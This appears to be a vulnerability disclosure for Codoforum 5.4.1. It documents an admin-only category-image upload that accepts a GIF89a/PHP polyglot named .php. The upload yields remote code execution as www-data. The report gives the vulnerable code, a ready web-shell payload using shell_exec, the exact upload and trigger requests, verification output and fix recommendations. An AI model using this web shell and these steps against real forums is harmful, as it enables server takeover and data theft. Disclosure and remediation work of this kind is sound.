# Codoforum 5.4.1 — Admin Category-Image Polyglot Upload → www-data RCE

## 1. Overview

Codoforum is a self-hosted PHP forum. The admin category management page includes a category-image upload endpoint (`admin/modules/categories.php`, `uploadFile()`, ~line 285-305) that validates uploads **only by content** via `getimagesize()` and writes the file using the attacker-controlled `$_FILES['cat_img']['name']` with no `basename()` and no extension whitelist. A GIF89a-header + PHP-body polyglot named `evil.php` passes the content check, lands in `sites/default/assets/img/cats/evil.php`, and is executed by Apache mod_php (`<FilesMatch \.php$> SetHandler application/x-httpd-php</FilesMatch>`; the directory's `.htaccess` only rewrites non-existent files, and no per-directory rule blocks PHP execution).

The upload endpoint is reached via the `mode=new` branch (`admin/modules/categories.php` ~line 270-292), which requires a valid admin session and CSRF token; `uploadFile(null)` executes at line 280 **before** the category INSERT at line 292, so even a failed insert leaves the shell file on disk. This is an incomplete-patch variant of CVE-2022-31854 (v5.1 logo-upload RCE): the vendor's patch filtered `.php` in the `forum_logo` upload in `admin/modules/config.php` but did not apply the same filter to `cat_img`. Verified end-to-end: upload → `uid=33(www-data)` command execution via `GET /sites/default/assets/img/cats/cf_evil.php?c=id`.

## 2. Vulnerability Summary

- **Type**: Authenticated arbitrary file upload → PHP code execution (CWE-434)
- **Root cause 1 (CWE-434)**: `uploadFile()` calls `move_uploaded_file($tmp, '../sites/default/assets/img/cats/' . $file_name)` with the attacker-controlled filename (extension preserved, no whitelist)
- **Root cause 2 (CWE-434/CWE-353)**: `Upload::image()` trusts `getimagesize()` content-only validation — a GIF89a polyglot with a PHP body passes
- **Root cause 3 (CWE-94)**: the upload directory is web-reachable and executes `.php` via mod_php (no per-directory denial)
- **Result**: authenticated admin → www-data RCE. CVSS 7.2.

## 3. Authentication Boundary

Backend admin authentication (`admin/modules/login.php`) validates username/password and sets `$_SESSION[UID.'A_loggedin']='admin'` only when `hasRoleId(ROLE_ADMIN)` passes. CSRF protection (`CSRF.php:25`, `token = md5(uniqid(random_int()))`, session-bound, obtained anonymously via `GET /user/login`) must also be satisfied. The admin gate is solid (independent `A_loggedin` flag + `hasRoleId`); there is no unauthenticated bypass — Target A is architecturally unreachable. The vulnerability is Target B (authenticated RCE).

## 4. Attack Surface

- **Entry**: `POST /admin/index.php?page=categories` (multipart/form-data), `mode=new`, valid admin session + CSRF token
- **Controllable parameters**: `$_FILES['cat_img']['name']` (the filename, including extension), `$_FILES['cat_img']['type']`, the file content (GIF89a polyglot)
- **No sanitization**: no `basename()`, no extension whitelist, no path-traversal filter (not needed — `.php` extension suffices)
- **Privilege**: www-data (uid 33, Apache mod_php)
- **Default configuration**: the `cat_img` upload point exists by default, the `cats/` directory is writable, and no extra whitelist configuration is required

## 5. Sink Identification

The sink (`admin/modules/categories.php`, `uploadFile()`):

```php
function uploadFile($old) {
    $file = $_FILES['cat_img'];
    $file_name = $file['name'];           // attacker-controlled, no basename()
    $file_path = $file['tmp_name'];
    if (\CODOF\File\Upload::image($file)) {   // content-only getimagesize check
        move_uploaded_file($file_path, '../sites/default/assets/img/cats/' . $file_name);
        return $file_name;
    }
    return null;
}
```

The content validator (`sys/File/Upload.php`):

```php
public static function image($file) {
    $info = getimagesize($file['tmp_name']);   // checks only that content is a valid image
    return $info !== false && in_array($info[2], [IMAGETYPE_GIF, IMAGETYPE_JPEG, ...]);
}
```

`getimagesize()` validates only the content header — not the extension. A GIF89a polyglot passes.

## 6. Source Identification & Controllability

The source is `$_FILES['cat_img']['name']` — the multipart `filename="cf_evil.php"` field, fully attacker-controlled, including the extension. There is no sanitization anywhere between the source and the sink. The upload call order guarantees the file lands even if the subsequent database insert fails.

## 7. Data Flow

```
Attacker multipart request
  └─ filename="cf_evil.php"  (Source: $_FILES['cat_img']['name'])
      └─ uploadFile() line 285: $file_name = $file['name']  (no sanitization)
          └─ Upload::image() line 287: getimagesize() content check (GIF89a polyglot passes)
              └─ move_uploaded_file($tmp, '../sites/default/assets/img/cats/' . $file_name) line 288
                  └─ cf_evil.php lands (with PHP body)
                      └─ GET /sites/default/assets/img/cats/cf_evil.php?c=id
                          └─ Apache mod_php executes .php → shell_exec($_GET['c']) → www-data RCE
```

## 8. Exploit Construction

Polyglot payload (35-byte valid GIF89a 1x1 header + PHP body):

```
GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b
<?php echo shell_exec($_GET[chr(99)]); ?>
```

`chr(99)` = `'c'`, keeping the payload generic. `getimagesize` returns `image/gif` for the 81-byte file.

Upload request (multipart, `mode=new`, valid `CSRF_token`, filename `cf_evil.php`, `Content-Type: image/gif`); trigger request: `GET /sites/default/assets/img/cats/cf_evil.php?c=id`.

## 9. Dynamic Verification

End-to-end run:
1. Admin login → `A_loggedin=admin`
2. Fetch CSRF token (32 hex)
3. Multipart upload polyglot → "New Category Created!", shell lands
4. `GET cf_evil.php?c=id` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
5. Marker write: `GET cf_evil.php?c=echo cfpwned59 > /tmp/cf_rce59_marker` → target-side `/tmp/cf_rce59_marker` (www-data-owned, content `cfpwned59`)

The `.htaccess` in `cats/` (`RewriteCond %{REQUEST_FILENAME} !-f`) does not rewrite existing files, so `cf_evil.php` is served directly by Apache and executed by mod_php.

## 10. Reachability & Impact

- **Reachability**: requires an admin account (Target B) — no other preconditions on a default deployment; the upload runs before the insert, so even a failed category creation leaves the shell.
- **Impact**: arbitrary PHP code execution as www-data — the forum database, user data, and application files under attacker control; in shared or unprivileged setups this commonly escalates to the underlying host.
- **Scope**: Codoforum 5.4.1 and other versions with the unpatched `cat_img` upload; the same incomplete-patch pattern affects all upload points lacking the `.php` filter.

The attack is a single HTTP request after login: one multipart POST uploads the polyglot, and one GET triggers it. No file-system access, no plugin installation, and no chained vulnerability is needed. The `cats/` upload directory is part of the default installation and ships without any PHP-execution block, so the only prerequisite is the admin credential. The same content-check pattern (`getimagesize`-only) exists on the avatar, badge, and smiley upload points, meaning the fix must be applied as a shared upload-handling routine rather than per-endpoint blacklists.

## 11. Fix Recommendations

1. Apply a unified extension whitelist (`pathinfo($file_name, PATHINFO_EXTENSION)` in `[gif,jpg,jpeg,png]`) to every upload point (logo/cat_img/avatar/badge/smiley)
2. Use `basename()` plus a randomized server-generated filename (`bin2hex(random_bytes(8)) . '.' . $ext`), discarding the attacker-supplied name
3. Block PHP execution in upload directories (`.htaccess` `php_flag engine off` or `<FilesMatch \.php> Require all denied </FilesMatch>`)
4. Validate Content-Type + extension + content together (MIME sniffing defense)

## 12. CWE & CVSS

- **CWE-434**: Unrestricted Upload of File with Dangerous Type — no extension whitelist on `cat_img`
- **CWE-353**: Failure to Check Support of Integrity Check Value — client-controlled filename/content
- **CWE-94**: Improper Control of Generation of Code — uploaded PHP executed
- **CVSS**: 7.2 High — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
